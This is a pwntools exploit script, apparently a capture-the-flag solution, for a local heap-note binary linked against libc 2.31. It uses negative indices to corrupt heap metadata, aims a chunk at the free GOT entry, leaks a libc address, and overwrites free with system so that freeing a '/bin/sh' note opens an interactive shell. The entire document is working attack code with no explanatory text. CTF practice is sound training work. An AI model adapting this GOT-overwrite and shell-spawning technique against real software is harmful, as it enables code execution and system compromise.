from pwn import *

exe = context.binary = ELF('./chall1_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*0x401685
#            c
#            c 5
#            ''')

def note(choice, id, size, data = b'chino'):
    r.sendlineafter(b'> ', str(choice).encode('utf-8'))
    r.sendlineafter(b'Index: ', str(id).encode('utf-8'))
    if choice == 1:
        r.sendlineafter(b'Size: ', str(size).encode('utf-8'))
    r.sendafter(b'Data: ', data)
    
def choice(id, choice = 3):
    r.sendlineafter(b'> ', str(choice).encode('utf-8'))
    r.sendlineafter(b'Index: ', str(id).encode('utf-8'))


size_t = 16
note(1, 0, size_t)
note(1, 1, size_t)
note(1, 2, size_t)
choice(2)
choice(1)
note(1, -4, 48)

payload = b'a'*24 + p64(0x31) + p64(exe.got['free']-0x18)
note(2, 0, size_t, payload)

note(1, 1, size_t, b'/bin/sh\x00')
note(1, 2, size_t, b'a'*16)
note(1, -3, 48)

choice(2, 4)
r.recv(22)
libc_leak = r.recv(6)
libc.address = u64(libc_leak + b'\x00'*2) - 0x1e3bb0
print(hex(u64(libc_leak + b'\x00'*2)))
print(hex(libc.address))

payload = b'a'*0x18 + p64(libc.sym['system'])
note(2, 2, size_t, payload)
choice(1)

r.interactive()